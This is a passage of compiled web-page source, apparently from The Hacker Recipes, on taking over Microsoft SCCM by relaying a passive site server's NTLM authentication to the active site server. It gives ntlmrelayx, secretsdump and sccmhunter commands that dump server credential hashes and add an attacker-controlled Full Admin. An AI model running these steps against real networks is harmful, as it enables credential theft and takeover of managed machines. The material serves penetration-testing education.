<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">SharpSCCM.exe</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> get site</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">push-settings</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">mp </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;SCCM-Server&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">sc </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;&quot;</span></span></code></pre></div><h4 id="relay-from-a-passive-site-server-to-the-active-site-server" tabindex="-1">Relay from a passive site server to the active site server <a class="header-anchor" href="#relay-from-a-passive-site-server-to-the-active-site-server" aria-label="Permalink to &quot;Relay from a passive site server to the active site server&quot;">​</a></h4><div class="caution custom-block"><p>Some requirements are needed to perform the attack:</p><ul><li>a passive site server is present on the network and its reachable</li><li>knowing the NetBIOS name, FQDN, or IP address of the passive and active site servers is required</li><li>SMB signing is not required on the active site server (default)</li></ul></div><h5 id="step-1-setup-an-ntlm-relay-server-1" tabindex="-1">Step 1: setup an NTLM relay server <a class="header-anchor" href="#step-1-setup-an-ntlm-relay-server-1" aria-label="Permalink to &quot;Step 1: setup an NTLM relay server&quot;">​</a></h5><p>The target of the <a href="./../ntlm/relay">NTLM relay attack</a> must be set to the active site server, on the SMB service.</p>`,7)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-like"},{default:a(()=>i[16]||(i[16]=[e("p",null,[s("From UNIX-like systems, "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx.py"),s(" (Python) script can be used for that purpose.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $ACTIVE_SERVER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"."),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-smb2support"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -socks")])])])],-1)])),_:1}),t(n,{label:"Windows"},{default:a(()=>i[17]||(i[17]=[e("p",null,[s("From Windows systems, "),e("a",{href:"https://github.com/Kevin-Robertson/Inveigh",target:"_blank",rel:"noreferrer"},"Inveigh-Relay"),s(" (Powershell) can be used as an alternative to "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx.py"),s(", however it doesn't feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.")],-1)])),_:1})]),_:1}),i[30]||(i[30]=r(`<p>Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: <a href="./../ntlm/relay">NTLM Relay</a>.</p><h5 id="step-2-authentication-coercion-1" tabindex="-1">Step 2: authentication coercion <a class="header-anchor" href="#step-2-authentication-coercion-1" aria-label="Permalink to &quot;Step 2: authentication coercion&quot;">​</a></h5><p>The passive site server&#39;s authentication can be coerced with (<a href="./../print-spooler-service/printerbug">PrinterBug</a>, <a href="./../mitm-and-coerced-authentications/ms-efsr">PetitPotam</a>, <a href="./../mitm-and-coerced-authentications/ms-fsrvp">ShadowCoerce</a>, <a href="./../mitm-and-coerced-authentications/ms-dfsnm">DFSCoerce</a>, etc.).</p><p>If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the active server, a SMB session through socks proxy has been opened with administrative rights.</p><h5 id="step-3-dump-active-site-server-account-credentials" tabindex="-1">Step 3: dump active site server account credentials <a class="header-anchor" href="#step-3-dump-active-site-server-account-credentials" aria-label="Permalink to &quot;Step 3: dump active site server account credentials&quot;">​</a></h5><p>Through the socks session, it is possible to dump the local credentials stored in the SAM database, and the secrets from the LSA, with <a href="https://github.com/fortra/impacket" target="_blank" rel="noreferrer">Impacket</a>&#39;s <a href="https://github.com/fortra/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noreferrer">secretsdump.py</a> (Python).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">proxychains4</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> secretsdump.py</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $DOMAIN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$PASSIVE_SERVER</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">@</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$ACTIVE_SERVER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DOMAIN</span></span></code></pre></div><p>Retrieve the LM:NT hash of the server account.</p><h5 id="step-4-add-a-new-sccm-full-admin" tabindex="-1">Step 4: add a new SCCM <code>Full Admin</code> <a class="header-anchor" href="#step-4-add-a-new-sccm-full-admin" aria-label="Permalink to &quot;Step 4: add a new SCCM \`Full Admin\`&quot;">​</a></h5><p>Since the active site server must be a member of the SMS Provider administrators (it is member of the <code>SMS Admins</code> group), its credentials can be used to add a new controlled user to the <code>Full Admin</code> SCCM group. <a href="https://github.com/garrettfoster13/sccmhunter" target="_blank" rel="noreferrer">sccmhunter</a> (Python) can be used for this purpose.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sccmhunter.py</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> admin</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $ACTIVE_SERVER</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\$</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $LMHASH</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:NTHASH</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -ip</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $SMS_PROVIDER_IP</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() (</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">C:\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> add_admin</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> controlledUser</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() (</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">C:\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> show_admins</span></span></code></pre></div><p>Post exploitation via SCCM can now be performed on the network.</p><div class="caution custom-block"><p>The tool author (<a href="https://mobile.twitter.com/_mayyhem" target="_blank" rel="noreferrer">Chris Thompson</a>) warns that <a href="https://github.com/Mayyhem/SharpSCCM" target="_blank" rel="noreferrer">SharpSCCM</a> is a PoC only tested in lab. One should be careful when running in production environments.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/" target="_blank" rel="noreferrer">https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/</a></p><p><a href="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts" target="_blank" rel="noreferrer">https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts</a></p><p><a href="https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9" target="_blank" rel="noreferrer">https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9</a></p><p><a href="https://blog.xpnsec.com/unobfuscating-network-access-accounts/" target="_blank" rel="noreferrer">https://blog.xpnsec.com/unobfuscating-network-access-accounts/</a></p><p><a href="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1" target="_blank" rel="noreferrer">https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1</a></p><p><a href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a" target="_blank" rel="noreferrer">https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a</a></p><p><a href="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf" target="_blank" rel="noreferrer">https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf</a></p><p><a href="https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43" target="_blank" rel="noreferrer">https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43</a></p>`,22))])}const v=o(k,[["render",u]]);export{E as __pageData,v as default};
